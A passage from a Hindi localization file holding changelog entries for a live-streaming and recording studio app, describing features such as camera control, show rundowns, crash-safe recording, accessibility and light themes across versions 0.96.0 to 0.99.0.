VISCA-over-IP के ज़रिए पैन / टिल्ट / ज़ूम कैमरे, नामित प्रीसेट और हर सीन के लिए ऑटो-रिकॉल के साथ (प्रोग्राम पर जाने वाला सीन अपना जुड़ा हुआ शॉट वापस बुला लेता है)। सिर्फ़ LAN; कैमरा सिर्फ़ इसलिए मौजूद होता है क्योंकि उसका पता डाला गया — कुछ भी खोजा नहीं जाता।","changelog.23f2bea95258":"<strong>शो रनडाउन</strong> (CAP-N09)। चरणों की एक क्रमबद्ध प्लेलिस्ट — एक सीन और वह कितनी देर रहता है, साथ में वैकल्पिक क्रियाएँ — मैनुअल या अपने-आप आगे बढ़ने और लाइव &quot;अगला + बचा समय&quot; के साथ। रनडाउन चलाना सीन को सामान्य, पूर्ववत किए जा सकने वाले तरीके से बदलता है; यह कभी सीन संग्रह को संपादित नहीं करता।","changelog.2e60fbc8afc7":"<strong>कम-लेटेंसी पासथ्रू मॉनिटर</strong> (CAP-N69)। एक प्रोजेक्टर जो किसी कैप्चर डिवाइस के <strong>कच्चे</strong> फ़्रेम दिखाता है — न सीन, न फ़िल्टर, न कंपोज़िटर — मापी गई कैप्चर→डिस्प्ले लेटेंसी की रीडिंग के साथ, ताकि कैप्चर कार्ड से आने वाली गेम फ़ीड को कम से कम देरी के साथ देखा जा सके।","changelog.0e3a7f16e7d8":"<strong>पिक्सेल-परफ़ेक्ट स्केलिंग मोड</strong> (CAP-N70)। हर आइटम के लिए smooth, nearest-neighbor, integer-snapped या sharp-bilinear स्केलिंग — रेट्रो/पिक्सेल-आर्ट सामग्री बिना धुँधलेपन के कैनवस तक पहुँचती है।","changelog.ffa3f0ee68cd":"<strong>पंच-इन ज़ूम और फ़ॉलो पैन</strong> (CAP-N71)। critically-damped एनिमेशन के साथ किसी भी कैप्चर में व्हील से ज़ूम करें, तीन हॉटकी प्रीसेट, और एक वैकल्पिक फ़ॉलो मोड जो कर्सर का पीछा करता है।","changelog.d331c3ab49e3":"<strong>काली पट्टियों का अपने-आप क्रॉप</strong> (CAP-N72)। किसी सोर्स से letterbox/pillarbox पट्टियाँ पहचानें और क्रॉप करें, एक बार में या लगातार, जैसे-जैसे सामग्री का आस्पेक्ट बदले।","changelog.c5425a9fc61b":"<strong>विंडो↔ऐप-ऑडियो का अपने-आप जुड़ना</strong> (CAP-N73)। किसी विंडो के साथ उसके ऐप्लिकेशन का ऑडियो भी कैप्चर करें; विंडो छिपाने पर जुड़ी हुई स्ट्रिप म्यूट होती है और दिखाने पर अनम्यूट — मैनुअल म्यूट को कभी बिगाड़े बिना।","changelog.372de0cef652":"<strong>कैप्चर के लिए HDR→SDR टोन-मैप</strong> (CAP-N74)। HDR डिस्प्ले के आउटपुट को SDR कैनवस पर मैप करें (clip / रंगत बचाने वाला maxRGB / Reinhard / BT.2408 knee), समायोज्य paper-white स्तर के साथ, और हर डिस्प्ले के लिए कैप्चर फिर से शुरू किए बिना लाइव ट्यून करें।","changelog.1ee387582d9c":"सुरक्षा और विश्वसनीयता","changelog.647e3c52982e":"हर स्वचालन सतह साझा रिमोट-API allowlist (<code>ALLOWED_COMMANDS</code>) से होकर जाती है, इसलिए कोई भी नियम, मैक्रो, MIDI/OSC बाइंडिंग, पैनल बटन या रनडाउन चरण ऐसे कमांड तक नहीं पहुँच सकता जिस तक ऐप के अपने बटन नहीं पहुँचते — यह एक परीक्षण से सत्यापित है कि allowlist और उसकी डिस्पैच शाखाएँ कभी अलग-अलग नहीं हो सकतीं।","changelog.3ebb5ae804a8":"<code>FileChanged</code> ट्रिगर मौजूदा रिमोट-पाथ गार्ड का पालन करता है, इसलिए किसी फ़ाइल पर नज़र रखना कभी UNC पाथ की जाँच नहीं करता (कोई NTLM क्रेडेंशियल लीक नहीं)।","changelog.894554d366f3":"दोनों LAN कंट्रोल सरफ़ेस (पैनल, OSC) पोर्ट को नेटवर्क के लिए खोलने से पहले सेटिंग्स में चेतावनी देते हैं कि LAN ट्रैफ़िक एन्क्रिप्ट नहीं है।","changelog.f8d204cd91ea":"[0.99.0] — 2026-07-12 (सोर्स, डिवाइस और कैलिब्रेशन — CAP-M बैच 3)","changelog.26f64316b751":"तीसरा और आख़िरी अनिवार्य बैच: ग्लास और कैनवस के बीच की हर चीज़। पूरी श्रृंखला को कैलिब्रेट करने के लिए बिल्ट-इन टेस्ट सिग्नल और एक निर्देशित A/V सिंक वर्कबेंच; डेटा पर चलने वाले शो के लिए टाइमर/घड़ी और फ़ाइल से जुड़े टेक्स्ट सोर्स; हर बाइंडिंग की जाँच करने वाला एक हॉटकी मैप; मिक्सर कंसोल की छूटी हुई सुविधाएँ; और डिवाइस की असली गहराई — डी-इंटरलेसिंग और हर डिवाइस की प्रोफ़ाइल के साथ क्रॉस-प्लेटफ़ॉर्म कैमरा नियंत्रण।","changelog.bc670f3d3c34":"<strong>टेस्ट सिग्नल सोर्स</strong> (CAP-M21)। SMPTE-शैली के कलर बार, एक कैलिब्रेशन ग्रिड/क्रॉसहैच, एक मोशन स्वीप, 1 kHz लाइनअप टोन (−20 dBFS), और एक ही घड़ी से बना एक संयुक्त <strong>A/V सिंक फ़्लैश+बीप</strong> पैटर्न — बिना कोई कैमरा लगाए सीन, एनकोडर, प्रोजेक्टर और स्ट्रीम लक्ष्य जाँचें।","changelog.5c359f960e3e":"<strong>A/V सिंक कैलिब्रेशन वर्कबेंच</strong> (CAP-M20)। एक निर्देशित टूल जो फ़्लैश+बीप पैटर्न को आपके डिस्प्ले और स्पीकर पर चलाता है, देखता है कि आपका कैमरा और माइक्रोफ़ोन उसे वापस कैप्चर करते हैं, शुद्ध सिग्नल प्रोसेसिंग से अंतर मापता है (कई चक्रों पर onset पहचान, ईमानदार विफलता मार्गदर्शन के साथ — अँधेरा कमरा, चुप माइक, कमरे का ऐसा शोर जो पैटर्न नहीं है), और नतीजे को माइक्रोफ़ोन के सिंक ऑफ़सेट पर लागू करने का विकल्प देता है। मैनुअल स्लाइडर विकल्प के रूप में बना रहता है। लूपबैक को लेकर ईमानदारी: आपके डिस्प्ले/स्पीकर की लेटेंसी भी मापी गई चीज़ का हिस्सा है।","changelog.5f3aaabe7c80":"<strong>टाइमर और घड़ी सोर्स</strong> (CAP-M15)। टेक्स्ट सोर्स का एक परिवार: दीवार घड़ी (strftime फ़ॉर्मैट + निश्चित UTC ऑफ़सेट), काउंटडाउन (किसी अवधि तक या घड़ी के अगले समय तक, शून्य पर एक क्रिया के साथ — चेहरा चमकाएँ या सीन बदलें), ऊपर की ओर गिनने वाली स्टॉपवॉच, और लाइव होने के बाद से / रिकॉर्डिंग शुरू होने के बाद से बीता समय। सोर्स की प्रॉपर्टीज़ से या दो नई ग्लोबल हॉटकी से (सभी टाइमर एक साथ) शुरू/रोकें/रीसेट करें। चेहरे सिर्फ़ तब दोबारा बनते हैं जब उनका टेक्स्ट बदलता है।","changelog.e4a01e4da67e":"<strong>फ़ाइल से टेक्स्ट + डेटा बाइंडिंग</strong> (CAP-M16)। कोई टेक्स्ट सोर्स किसी निगरानी वाली लोकल फ़ाइल से जुड़ सकता है: पूरी <code>.txt</code>, एक CSV सेल (हेडर का नाम या इंडेक्स), या एक JSON मान (RFC 6901 पॉइंटर) — बदलाव के आधे सेकंड के भीतर फिर से पढ़ा जाता है, और atomic-write (temp+rename) वाले एडिटर को झेलने के लिए आख़िरी सही मान स्क्रीन पर रखा जाता है। स्कोरबोर्ड/लोअर-थर्ड की नींव, किसी सेवा की ज़रूरत नहीं। OBS आयातक अब &quot;फ़ाइल से पढ़ें&quot; को भी मैप करता है।","changelog.99703cca8970":"<strong>एक हॉटकी मैप</strong> (CAP-M14)। <strong>हर</strong> बाइंडिंग की एक खोजने और फ़िल्टर करने योग्य तालिका — ग्लोबल क्रियाएँ और हर सोर्स के पुश-टू-टॉक/पुश-टू-म्यूट — ईमानदार टकराव संकेतों के साथ: दो तरह से लिखा गया एक ही कॉर्ड साझा के रूप में चिह्नित होता है, और जिस कुंजी को OS ने पंजीकृत करने से मना कर दिया (किसी दूसरे ऐप के पास है, या इस कंपोज़िटर पर उपलब्ध नहीं), वह यह बात बताती है। Downloads में एक Markdown चीट शीट निर्यात करता है। सेटिंग्स → हॉटकी बाइंडिंग करता है; यह जाँचता और दर्ज करता है।","changelog.ee68b38bf053":"<strong>मिक्सर की पूर्णता: पैन, सोलो, मोनो</strong> (CAP-M19)। हर स्ट्रिप का स्टीरियो <strong>बैलेंस</strong> (केंद्र, बिना पैन के बिट-दर-बिट समान है), <strong>PFL सोलो</strong> (मॉनिटर में सिर्फ़ सोलो की गई स्ट्रिप सुनाई देती हैं — प्रोग्राम मिक्स कभी नहीं बदलता), और हर सोर्स का <strong>मोनो डाउनमिक्स</strong>।","changelog.7ab38b03302e":"<strong>डिवाइस सोर्स के लिए डी-इंटरलेसिंग</strong> (CAP-M17)। हर डिवाइस के लिए discard / bob / linear / blend / motion-adaptive (yadif-श्रेणी), फ़ील्ड-क्रम चुनने के साथ — कैप्चर थ्रेड पर सिर्फ़ CPU, हर OS पर एक जैसा। मोड बदलने पर डिवाइस फिर से शुरू होता है, जैसे फ़ॉर्मैट बदलने पर।","changelog.10b030797364":"<strong>हर डिवाइस की प्रोफ़ाइल के साथ कैमरा नियंत्रण</strong> (CAP-M18)। वेबकैम और कैप्चर कार्ड के लिए एक्सपोज़र, व्हाइट बैलेंस, फ़ोकस, ज़ूम, गेन (और भी बहुत कुछ), एक ही क्रॉस-प्लेटफ़ॉर्म रास्ते से — Windows/Linux पर नेटिव API के ज़रिए UVC; macOS पर वही दिखता है जो AVFoundation बताता है, जो अक्सर कुछ नहीं होता, और पैनल यह ईमानदारी से बताता है। हर समायोजन एक डिवाइस प्रोफ़ाइल में सहेजा जाता है जो हॉटप्लग और रीस्टार्ट पर फिर से लागू होती है।","changelog.1d38d97fe470":"[0.98.0] — 2026-07-12 (प्रसारण की सुरक्षा और विश्वसनीयता — CAP-M बैच 2)","changelog.4b98f0291de5":"दूसरा अनिवार्य बैच: <em>शो मत गँवाइए</em>। स्टूडियो अब विफलताओं को लाइव जाने से पहले पकड़ता है (लाइव से पहले की जाँच सूची), लाइव रहते हुए पकड़ता है (हमेशा चालू सुरक्षा अलार्म, सत्र के बीच एनकोडर फ़ेलओवर, सोर्स स्वास्थ्य डैशबोर्ड), और सबसे बुरा होने के बाद भी संभालता है (क्रैश में सुरक्षित रिकॉर्डिंग, अगली बार लॉन्च पर मरम्मत के साथ, और बंद करते समय एक गार्ड जो सब कुछ क्रम से पूरा करता है)। और जब आपको <em>अभी इसी वक़्त</em> सब कुछ छिपाना हो, तो एक पैनिक बटन है।","changelog.f4de38fb000e":"<strong>रिकॉर्डिंग फ़ाइल-नाम टेम्पलेट</strong> (CAP-M25)। टोकन-आधारित नामकरण — <code>{prefix}</code>, <code>{date}</code>, <code>{time}</code>, <code>{scene}</code>, <code>{profile}</code>, <code>{canvas}</code>, <code>{marker-count}</code>, और एक सहेजा रहने वाला <code>{counter}</code> — रिकॉर्डिंग, रीप्ले और स्टिल के लिए, टकराव से सुरक्षित अपने-आप लगने वाले प्रत्यय और रीप्ले व स्टिल के लिए <strong>हर आउटपुट के अलग फ़ोल्डर</strong> के साथ। नामों को हर प्लेटफ़ॉर्म के आरक्षित अक्षरों से साफ़ किया जाता है; टेम्पलेट की टाइपिंग गलती सहेजते समय ही पकड़ी जाती है।","changelog.4750f9f5b2ce":"<strong>सोर्स स्वास्थ्य डैशबोर्ड</strong> (CAP-M13)। पैलेट से खुलने वाला एक पैनल, जिसमें हर सोर्स की लाइव स्थिति, fps, <strong>आख़िरी फ़्रेम की उम्र</strong>, छूटे फ़्रेमों की गिनती और रीस्टार्ट का इतिहास है — साथ में हर सोर्स के लिए पुनरारंभ करें और प्रॉपर्टीज़। जिन सोर्स को इंजन नहीं चला रहा, वे ईमानदारी से &quot;निष्क्रिय&quot; दिखाते हैं।","changelog.977c064d0ab7":"<strong>बंद करने का गार्ड + क्रमबद्ध शटडाउन</strong> (CAP-M23)। लाइव, रिकॉर्डिंग या रीप्ले सक्रिय रहते हुए स्टूडियो बंद करने पर पहले पूछा जाता है — ठीक-ठीक बताते हुए कि क्या होगा — फिर बाहर निकलने से पहले स्ट्रीम ख़त्म की जाती है, रिकॉर्डिंग पूरी की जाती है और रीप्ले बफ़र ख़ाली किया जाता है, <strong>क्रम से</strong>। अब एक क्रैश-मार्कर फ़ाइल साफ़ तरीके से बंद होने और क्रैश के बीच फ़र्क़ करती है।","changelog.6102d929f559":"<strong>क्रैश में सुरक्षित रिकॉर्डिंग + बचाव का प्रॉम्प्ट</strong> (CAP-M11)। mp4/mov रिकॉर्डिंग <strong>खंडित (fragmented)</strong> रूप में लिखी जाती हैं (हर कीफ़्रेम पर इंडेक्स फ़्लश), इसलिए क्रैश या बिजली जाने पर न पढ़ी जा सकने वाली फ़ाइल के बजाय चलने योग्य फ़ाइल बचती है। अगर कोई सत्र रिकॉर्डिंग के बीच ठीक से बंद हुए बिना ख़त्म हो जाए, तो अगला लॉन्च एक क्लिक में <code>(repaired)</code> कॉपी में <strong>मरम्मत करें</strong> का विकल्प देता है — मूल फ़ाइल को कभी छुआ नहीं जाता।","changelog.9d1b1cce6db8":"<strong>सत्र के बीच एनकोडर फ़ेलओवर</strong> (CAP-M12)। अगर हार्डवेयर एनकोडर स्ट्रीम या रिकॉर्डिंग के बीच गड़बड़ा जाए (ड्राइवर रीसेट, GPU पर होड़), तो सत्र ख़त्म होने के बजाय एक सीढ़ी पर नीचे की ओर बिना रुके स्विच करता है — पहले दूसरा हार्डवेयर परिवार, फिर x264। स्ट्रीम अपने मौजूदा री-कनेक्ट से चलती रहती है; रिकॉर्डिंग एक नई फ़ाइल में जारी रहती है; एक ईमानदार टोस्ट + स्टैट्स डॉक में टिका रहने वाला नोट ठीक-ठीक बताते हैं कि क्या हुआ। नेटवर्क की गड़बड़ी से कभी स्विच नहीं होता।","changelog.08f429a15748":"<strong>प्रसारण सुरक्षा अलार्म</strong> (CAP-M10)। आउटपुट चलने के दौरान हमेशा चालू निगरानी: <strong>प्रोग्राम ऑडियो का चुप होना</strong>, <strong>लगातार क्लिपिंग</strong>, <strong>काली या जमी हुई प्रोग्राम तस्वीर</strong> (क्लासिक CV — मौजूदा readback पर सैंपल किया गया luma + फ़्रेम अंतर, कोई ML नहीं), और <strong>कम डिस्क का पूर्वानुमान</strong> (&quot;मौजूदा बिटरेट पर ~22 मिनट बचे हैं&quot;)। मोडल नहीं: हटाया जा सकने वाला बैनर + स्क्रीन-रीडर घोषणा।","changelog.a76206a6a95f":"<strong>पैनिक बटन</strong> (CAP-M22)। एक ग्लोबल हॉटकी प्रोग्राम (और वर्टिकल कैनवस, और सभी प्रोजेक्टर) को एक कॉन्फ़िगर की जा सकने वाली प्राइवेसी स्लेट पर काट देती है, हर कैप्चर रोक देती है और सारा ऑडियो पूरी तरह म्यूट कर देती है — माइक्रोफ़ोन कैप्चर तक नहीं होता — जबकि स्ट्रीम और रिकॉर्डिंग चलती रहती हैं। वापस लौटना जान-बूझकर दो चरणों वाली पुष्टि है।","changelog.0df040fc21b0":"<strong>गोपनीय जानकारी हटाया गया डायग्नोस्टिक्स बंडल</strong> (CAP-M24)। &quot;डायग्नोस्टिक्स निर्यात करें&quot; एक सख़्त <strong>allowlist</strong> से बनी zip लिखता है (कॉन्फ़िग स्नैपशॉट, एनकोडर/डिवाइस प्रोब, हाल के आँकड़े, आख़िरी क्रैश रिपोर्ट) — स्ट्रीम कुंजियाँ, पासवर्ड, टोकन, फ़ाइल पाथ और उपयोगकर्ता का टेक्स्ट कभी पढ़े तक नहीं जाते, शामिल करना तो दूर। निर्यात से पहले आप ठीक-ठीक सामग्री पढ़ सकते हैं; कुछ भी कभी कहीं नहीं भेजा जाता।","changelog.4047624f0a67":"<strong>लाइव जाने से पहले की जाँच सूची</strong> (CAP-M09)। लाइव जाएँ अब पहले जाँचें चलाता है: लक्ष्यों की कुंजियाँ मौजूद, एनकोडर इस्तेमाल लायक, सोर्स स्वस्थ, डिस्क में पर्याप्त जगह — हर एक हरा/लाल, एक-क्लिक सुधार के साथ — साथ में माइक/डेस्कटॉप-ऑडियो मीटरिंग और रीप्ले बफ़र के लिए ईमानदार सुझाव। एक वैकल्पिक सेटिंग लाइव जाएँ को तब तक रोके रखती है जब तक हर रोकने वाली जाँच हरी न हो जाए।","changelog.f0bd6b1eb67e":"mp4/mov रिकॉर्डिंग अंत में इंडेक्स लिखने (<code>+faststart</code>) से हटकर खंडित (fragmented) लेखन पर आ गई हैं; जब कोई एडिटर क्लासिक faststart फ़ाइल पर ही अड़ा हो, तो बचाव वाली मरम्मत (या Remux) वैसी फ़ाइल बना देती है।","changelog.e2f271c14a12":"<code>HotkeySettings</code> वैलिडेटर अब स्टिल-ग्रैब और पैनिक accelerator को भी सीमित करता है।","changelog.d236ab9ba3fe":"[0.97.0] — 2026-07-11 (सीन बनाना और निगरानी — CAP-M बैच 1)","changelog.4b1bad38a6e8":"1.0.0 की राह पर तीन अनिवार्य बैचों में से पहला। कंपोज़िटर सिर्फ़ चलाए जाने के बजाय स्टूडियो की तरह <em>संपादित</em> होना सीखता है: हर सीन संपादन के पीछे undo इतिहास, संरेखण-और-वितरण और खींचकर निकाले जाने वाले गाइड के साथ बहु-चयन, आइटम के बीच कॉपी किए जा सकने वाले सटीक ट्रांसफ़ॉर्म, और एक कीइंग वर्कबेंच जो आपको मैट दिखाता है। और यह <em>देखे जाने</em> लायक़ भी बनता है: हर सीन का एक मल्टीव्यू, किसी भी डिस्प्ले पर किसी भी सीन / सोर्स / प्रोग्राम / प्रीव्यू के लिए फ़ुलस्क्रीन प्रोजेक्टर, और एक कुंजी से लॉसलेस स्टिल ग्रैब। आख़िर में, यह उस दुनिया के लिए खुलता है जहाँ से यह आया है — OBS सीन संग्रह आयात करना, और खिसक चुके मीडिया को ढूँढना।","changelog.7219ebda2472":"<strong>हर सीन संपादन के लिए कई चरणों वाला undo/redo</strong> (CAP-M01)। सीमित, लेबल वाला स्नैपशॉट इतिहास उसी लॉक के नीचे चलता है जिसके नीचे संग्रह है; एक लगातार चलने वाला हावभाव (खींचना, फ़ेडर चलाना) एक ही चरण में सिमट जाता है; <code>Ctrl</code>/<code>Cmd</code>+<code>Z</code> संपादनों को पलटता है — लाइव शो को कभी नहीं (प्रोग्राम सीन चुनना, केंद्र व्यू और फ़ोकस स्टैक से बाहर रहते हैं)। एक देखी जा सकने वाली इतिहास सूची ठीक-ठीक दिखाती है कि हर चरण क्या पूर्ववत करेगा।","changelog.aae31a6bbe7f":"<strong>OBS सीन-संग्रह आयातक</strong> (CAP-M02)। इसे OBS की <code>scenes.json</code> दें और यह सीन, z-क्रम, हर आइटम की दृश्यता/लॉक/ब्लेंड, रंग/टेक्स्ट/इमेज/मीडिया सोर्स, डिस्प्ले/विंडो/ कैमरा/ऑडियो कैप्चर, नेस्टेड सीन, और जिन वीडियो <strong>और</strong> ऑडियो फ़िल्टर को यह पहचानता है, उन्हें मैप करता है — फिर एक <strong>ईमानदार, हर सोर्स की रिपोर्ट</strong> लौटाता है: क्या साफ़ आया, किसके लिए कैप्चर डिवाइस फिर से चुनना है, कौन किसी ऐसी फ़ाइल का हवाला देता है जिसे जाँचना है, और किसका कोई समकक्ष नहीं था और उसे छोड़ दिया गया। आइटम के आकार और स्थितियाँ OBS के लेआउट से बिठाई जाती हैं (सीन फ़ाइल में न सोर्स के नेटिव आकार होते हैं, न कैनवस), इसलिए रिपोर्ट यह बात बताती है।","changelog.d6bb32be4ef4":"<strong>गायब-फ़ाइल डॉक्टर</strong> (CAP-M03)। लोड होने पर — या पैलेट से माँगने पर — यह संग्रह में ऐसे इमेज / मीडिया / फ़ॉन्ट / LUT / मास्क पाथ खोजता है जो अब रिज़ॉल्व नहीं होते और हर एक को फिर से लिंक करने का विकल्प देता है। एक टूटा पाथ ठीक करने पर हर वह सीन ठीक हो जाता है जो उसे इस्तेमाल करता था; &quot;फ़ोल्डर में ढूँढें…&quot; नाम से एक साथ मिलान करता है।","changelog.6f96fd6fdf78":"<strong>संरेखण को पूरा बहु-चयन मिलता है</strong> (CAP-M04)। Shift-क्लिक और रबर-बैंड चयन से कई आइटम चुनें; उनमें से किसी को भी खींचकर पूरे समूह को ले जाएँ (एक बॉक्स की तरह स्नैप); उनके किनारों/केंद्रों को एक-दूसरे से संरेखित करें या उन्हें बराबर बाँटें। और आप अपनी ख़ुद की <strong>गाइड रेखाएँ</strong> खींचकर निकाल सकते हैं — ले जाने के लिए खींचें, हटाने के लिए कैनवस से बाहर खींचें — जिन पर खींचे गए आइटम स्नैप होते हैं, और जो JPEG और नेटिव GPU प्रीव्यू, दोनों पर बनती हैं।","changelog.13b73aeb27b0":"<strong>कॉपी/पेस्ट वाला सटीक ट्रांसफ़ॉर्म पैनल</strong> (CAP-M05)। किसी आइटम की एंकर-सापेक्ष स्थिति, आकार, घुमाव और क्रॉप टाइप करें; एक ट्रांसफ़ॉर्म या पूरी फ़िल्टर चेन कॉपी करें और उसे एक ही undo चरण के रूप में किसी दूसरे आइटम पर पेस्ट करें।","changelog.5b8587772325":"<strong>कीइंग वर्कबेंच</strong> (CAP-M26)। एक लाइव एकल-सोर्स व्यू के सामने chroma/रंग/luma की को ट्यून करें, मैट मोड (अल्फ़ा → धूसर), आईड्रॉपर, आवर्धक लेंस और खींचे जा सकने वाले पहले/बाद वाले विभाजन के साथ।","changelog.630487ce7411":"<strong>मल्टीव्यू मॉनिटर</strong> (CAP-M06) — हर सीन का एक लाइव ग्रिड, लाल (प्रोग्राम) / हरा (प्रीव्यू) टैली के साथ; कट करने के लिए या (स्टूडियो मोड में) तैयार करने के लिए क्लिक करें। इसे किसी भी डिस्प्ले पर अपनी अलग विंडो के रूप में खोला जा सकता है।","changelog.cfb92d0b5e04":"<strong>किसी भी चीज़ के लिए, कहीं भी प्रोजेक्टर</strong> (CAP-M07) — प्रोग्राम, स्टूडियो मोड का प्रीव्यू, कोई <strong>ख़ास सीन</strong> या कोई <strong>एक सोर्स</strong> किसी भी जुड़े डिस्प्ले पर फ़ुलस्क्रीन में (या एक तैरती विंडो में) दिखाएँ। अगली बार लॉन्च करने पर प्रोजेक्टर वहीं फिर से खुलते हैं जहाँ आपने उन्हें छोड़ा था।","changelog.d31889806a32":"<strong>एक कुंजी से स्टिल ग्रैब</strong> (CAP-M08) — प्रोग्राम (या किसी एक सोर्स, फ़िल्टर से पहले/बाद) की एक लॉसलेस PNG रिकॉर्डिंग फ़ोल्डर में, जिसे एक ग्लोबल हॉटकी से जोड़ा जा सकता है।","changelog.77c37009de86":"सीन चयन अब पूरे प्रीव्यू में पूर्ण दर्जे का बहु-चयन है; एक बैच ट्रांसफ़ॉर्म संरेखण / वितरण / समूह को खिसकाने को एक ही undo चरण के रूप में दर्ज करता है।","changelog.f1cc3f1d7724":"<code>preview://</code> पाइप में अब मौजूदा प्रोग्राम / प्रीव्यू / वर्टिकल / वर्कबेंच / मल्टीव्यू स्लॉट के साथ-साथ हर लक्ष्य के पूर्ण-रिज़ॉल्यूशन प्रोजेक्टर स्लॉट और हर सीन के लिए प्रोजेक्टर रूटिंग भी है; CORS ऐप के अपने origin तक ही सीमित रहता है।","changelog.e27bd21b1216":"[0.96.0] — 2026-07-10 (सुगम्यता, 18 भाषाएँ, ऑनबोर्डिंग और थीम)","changelog.dfb83dff1086":"चरण 9: लॉन्च से पहले का निखार। स्टूडियो अब अठारह भाषाएँ बोलता है, पूरी तरह कीबोर्ड से चलाया जा सकता है और स्क्रीन रीडर से सुना जा सकता है, पहली बार चलने पर ख़ुद को कॉन्फ़िगर करता है, और उसे हल्की थीम दी जा सकती है।","changelog.ed8d27bca3a0":"नीचे की दो गड़बड़ियाँ 1.0.0 में शिप हो जातीं और उनका नाम लेना ज़रूरी है, क्योंकि दोनों समीक्षा में अदृश्य थीं और अब दोनों को याददाश्त के बजाय एक lint या एक परीक्षण लागू करता है। हल्की थीम सिर्फ़ आधी ठीक हुई थी — किसी सतह पर हल्का override हो या न हो, डार्क मोड बिल्कुल सही दिखता है, इसलिए सफ़ेद पर सफ़ेद वाले नियंत्रण हर बार कोड समीक्षा पार कर जाते हैं। और 0.95.1 से अपग्रेड करने पर पहली बार चलने वाला विज़ार्ड फिर से चल जाता, जिसका स्टार्टर टेम्पलेट उस सीन पर एक दूसरा डिस्प्ले कैप्चर डाल देता है जिसे मौजूदा उपयोगकर्ता पहले ही सजा चुका था।","changelog.245328562168":"<strong>स्टूडियो 18 भाषाएँ बोलता है</strong> (TASK-902) — <code>ar de en es fr hi id it ja ko nl pl pt-BR ru tr uk vi zh-CN</code>, <strong>989 कुंजियों</strong> वाले एक Fluent कैटलॉग से। नया इंस्टॉल ऑपरेटिंग सिस्टम की भाषा अपनाता है; स्पष्ट रूप से चुनी गई भाषा को प्राथमिकता मिलती है। अरबी <code>&lt;html dir=&quot;rtl&quot;&gt;</code> लागू करती है। अंग्रेज़ी हर लोकेल के नीचे एक परत के रूप में रहती है, इसलिए जिस कुंजी तक अनुवादक नहीं पहुँचा, वह कच्चे id के बजाय अंग्रेज़ी में दिखती है। <code>npm run i18n:lint</code> किसी गायब कुंजी, अनाथ कुंजी, दोहराव, या किसी ऐसे <code>t(&quot;…&quot;)</code> पर CI को विफल कर देता है जो किसी चीज़ का नाम नहीं लेता।","changelog.c9eb7215afcc":"एक समानता lint साबित करता है कि 18 कैटलॉग <em>आपस में</em> मेल खाते हैं; वह इस बारे में कुछ नहीं कहता कि ऐप की स्ट्रिंग उनमें हैं या नहीं। तीन और गेट यह कमी पूरी करते हैं: एक परीक्षण कि किसी लेबल तालिका की हर प्रविष्टि रिज़ॉल्व होती है, ऐसी कुंजियों की स्कैन जिनका कहीं इस्तेमाल नहीं होता, और मॉड्यूल स्तर पर बुलाए गए <code>t()</code> की स्कैन — जो किसी स्ट्रिंग को उसी भाषा में जमा देता जो इम्पोर्ट के समय लोड थी, और उसे फिर कभी अनुवादित न करता।","changelog.060a09e005da":"<strong>पहली बार चलने वाला एक विज़ार्ड, जो उसी मशीन को कॉन्फ़िगर करता है जिस पर वह असल में चल रहा है</strong> (TASK-903, TASK-905)। यह GPU और फ़िज़िकल कोर गिनता है, उपलब्ध हार्डवेयर एनकोडरों को रैंक करता है, और एक एनकोडर, कैनवस, fps और बिटरेट प्रस्तावित करता है — <em>उपयोगकर्ता की भाषा में कारण बताते हुए</em>। जिस एनकोडर को ड्राइवर पहले ही मना कर चुका है, उसकी सिफ़ारिश करने के बजाय उसे छोड़ दिया जाता है। स्वीकार करना एक क्लिक है; अपनी सेटिंग्स रखना भी। छोड़ देना भी पूरा करना माना जाता है — विज़ार्ड फिर कभी नहीं लौटता।","changelog.62ba4a6d41af":"<code>Ctrl</code>/<code>Cmd</code>+<code>K</code> पर <strong>एक कमांड पैलेट</strong> (TASK-904), जो उप-अनुक्रमों से मिलान करता है, इसलिए <code>ssc</code> &quot;Start Screen Capture&quot; ढूँढ लेता है।","changelog.925da222cab8":"<strong>एक सेटिंग्स मोडल और एक परिचय पेज</strong> (TASK-906, TASK-907) — भाषा, थीम और स्टैट्स डॉक एक जगह; संस्करण, बिल्ड मेटाडेटा, लाइसेंस और बग रिपोर्टर दूसरी जगह।","changelog.bece666d04b9":"<strong>हल्की और कस्टम थीम।</strong> एक्सेंट रंग एक CSS कस्टम प्रॉपर्टी है जिसे IPC सीमा के दोनों ओर <code>#rrggbb</code> के रूप में सत्यापित किया जाता है, क्योंकि स्टाइलशीट में लिखी गई स्ट्रिंग इंजेक्शन का ठिकाना होती है।","changelog.dd70fb65720c":"<strong>स्टूडियो अब बिना माउस या मॉनिटर के चलाया जा सकता है</strong> (TASK-901)। हर कीबोर्ड पड़ाव एक दिखने वाला फ़ोकस रिंग बनाता है; डायलॉग <code>Tab</code> को अपने भीतर रोकते हैं और फ़ोकस वहीं लौटाते हैं जहाँ से लिया था; <code>aria-modal</code> के पीछे अब सिर्फ़ वादा नहीं, एक असली trap है। लाइव जाना, रिकॉर्ड करना, फिर से जुड़ना, और छूटे फ़्रेमों के कारण एक सेकंड का वीडियो गँवाना, ये सब एक <code>aria-live</code> क्षेत्र के ज़रिए स्क्रीन रीडर को बताए जाते हैं। OS की &quot;गति कम करें&quot; सेटिंग का पालन किया जाता है।","changelog.ff6f0dc97e11":"<strong>अपग्रेड करने पर अब पहली बार चलने वाला विज़ार्ड फिर से नहीं चलता।</strong> <code>completedOnboarding</code> नया है, और गायब कुंजी डिफ़ॉल्ट रूप से <code>false</code> होती है, इसलिए हर मौजूदा इंस्टॉल का स्वागत एक ऐसे विज़ार्ड से होता जिसका स्टार्टर टेम्पलेट उपयोगकर्ता के पहले से सजाए सीन के ऊपर एक <em>दूसरा</em> डिस्प्ले कैप्चर जोड़ देता है। सेटिंग्स फ़ाइलें अब लोड होते समय माइग्रेट की जाती हैं: जो फ़ाइल इस फ़ील्ड से पुरानी है पर EULA पहले ही स्वीकार कर चुकी है, वह साफ़ तौर पर पहले चल चुकी है। यह फ़ील्ड के <em>गायब</em> होने पर आधारित है, falsy होने पर नहीं — जो व्यक्ति विज़ार्ड को बीच में छोड़ देता है, उसने जान-बूझकर <code>false</code> लिखा है और उसे विज़ार्ड फिर से दिखना चाहिए।","changelog.5cf1579964ec":"<strong>हल्की थीम अब सफ़ेद पर सफ़ेद रेंडर नहीं करती।</strong> पैनल लगभग-काले रंग के ऊपर पारभासी <em>सफ़ेद</em> से बनाए जाते हैं, और CSS वेरिएबल किसी <code>bg-white/10</code> यूटिलिटी क्लास के भीतर नहीं पहुँच सकता, इसलिए हल्की थीम उन क्लास नामों को पारभासी काले रंग से फिर से रंगती है। छह छूट गए थे: मिक्सर के म्यूट/गेट चिप, REC 